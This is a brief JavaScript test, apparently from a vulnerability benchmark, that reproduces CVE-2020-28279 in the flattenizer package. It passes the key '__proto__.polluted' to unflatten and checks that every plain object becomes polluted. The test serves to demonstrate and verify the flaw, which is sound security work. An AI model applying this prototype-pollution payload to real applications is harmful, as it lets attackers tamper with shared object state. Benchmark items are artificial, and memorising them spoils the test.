//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28279
test("prototype pollution in flattenizer", () => {
  expect({}.polluted).toBe(undefined);

  const flattenizer = require("flattenizer");
  flattenizer.unflatten({ "__proto__.polluted": process.env.SECBENCH_PAYLOAD || ("yes") });

  expect({}.polluted).toBe("yes");
});
